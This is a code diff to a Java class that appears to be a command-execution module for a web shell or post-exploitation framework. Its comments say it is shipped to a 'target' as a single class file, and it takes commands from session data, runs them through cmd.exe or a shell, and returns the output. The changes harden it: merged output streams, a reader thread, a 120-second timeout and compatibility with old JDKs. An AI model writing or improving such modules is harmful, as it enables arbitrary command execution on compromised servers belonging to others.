@@ -5,9 +5,26 @@ import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.Map;
 
-public class CommandExecModule {
+/**
+ * Module classes are shipped to the target as a *single* class file, so an
+ * anonymous Runnable would leave a CommandExecModule$1 that never gets sent
+ * (NoClassDefFoundError on the target). The class therefore acts as its own
+ * Runnable: a throwaway second instance drains the merged output pipe.
+ */
+public class CommandExecModule implements Runnable {
     private Map session;
     private Object servletRequest;
+
+    /** Reader-thread state; only the throwaway instance built in executeWithProcessBuilder uses these. */
+    private InputStream readerStream;
+    private ByteArrayOutputStream readerBuffer;
+
+    public void run() {
+        try {
+            copyStream(this.readerStream, this.readerBuffer);
+        } catch (Exception ignored) {
+        }
+    }
 
     private String getString(String key) {
         Object value = this.session != null ? this.session.get(key) : null;
@@ -48,7 +65,7 @@ public class CommandExecModule {
     
     private byte[] executeWithProcessBuilder(String[] args, String cmdLine) {
         try {
-            ArrayList<String> commandList = new ArrayList<>();
+            ArrayList<String> commandList = new ArrayList<String>();
             
             if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 commandList.add("cmd.exe");
@@ -84,23 +101,37 @@ public class CommandExecModule {
             }
             
             ProcessBuilder processBuilder = new ProcessBuilder(commandList);
+            // Merge stderr into stdout: one pipe to drain, so the reader can
+            // never deadlock against an unread stderr buffer.
+            processBuilder.redirectErrorStream(true);
             Process process = processBuilder.start();
-            
-            byte[] outputBytes = readStream(process.getInputStream());
-            byte[] errorBytes = readStream(process.getErrorStream());
-            
-            process.waitFor();
 
-            if (errorBytes != null && errorBytes.length > 0) {
-                byte[] combined = new byte[(outputBytes != null ? outputBytes.length : 0) + errorBytes.length];
-                int offset = 0;
-                if (outputBytes != null && outputBytes.length > 0) {
-                    System.arraycopy(outputBytes, 0, combined, 0, outputBytes.length);
-                    offset += outputBytes.length;
+            final ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
+            CommandExecModule reader = new CommandExecModule();
+            reader.readerStream = process.getInputStream();
+            reader.readerBuffer = outBuf;
+            Thread tOut = new Thread(reader, "exec-stdout");
+            tOut.setDaemon(true);
+            tOut.start();
+
+            // JDK 1.6: Process.waitFor(long, TimeUnit) and destroyForcibly() are Java 8 only.
+            long deadline = System.currentTimeMillis() + 120000L;
+            boolean finished = false;
+            while (System.currentTimeMillis() < deadline) {
+                try {
+                    process.exitValue();
+                    finished = true;
+                    break;
+                } catch (IllegalThreadStateException notYet) {
+                    try { Thread.sleep(100L); } catch (InterruptedException ignored) { break; }
                 }
-                System.arraycopy(errorBytes, 0, combined, offset, errorBytes.length);
-                return combined;
             }
+            if (!finished) {
+                process.destroy();
+                return "timeout: process did not exit in 120s".getBytes();
+            }
+            try { tOut.join(5000L); } catch (InterruptedException ignored) {}
+            byte[] outputBytes = outBuf.toByteArray();
 
             return outputBytes != null ? outputBytes : new byte[0];
             
@@ -123,7 +154,7 @@ public class CommandExecModule {
             return null;
         }
 
-        ArrayList<String> args = new ArrayList<>();
+        ArrayList<String> args = new ArrayList<String>();
         for (int i = 0; i < argsCount; i++) {
             String arg = getString(String.format("arg-%d", i));
             if (arg != null) {
@@ -136,14 +167,16 @@ public class CommandExecModule {
     
     private byte[] readStream(InputStream stream) throws Exception {
         ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+        copyStream(stream, buffer);
+        return buffer.toByteArray();
+    }
+
+    private void copyStream(InputStream stream, ByteArrayOutputStream buffer) throws Exception {
         byte[] data = new byte[4096];
         int bytesRead;
-        
         while ((bytesRead = stream.read(data, 0, data.length)) != -1) {
             buffer.write(data, 0, bytesRead);
         }
-        
-        return buffer.toByteArray();
     }
     
     public String getModuleName() {
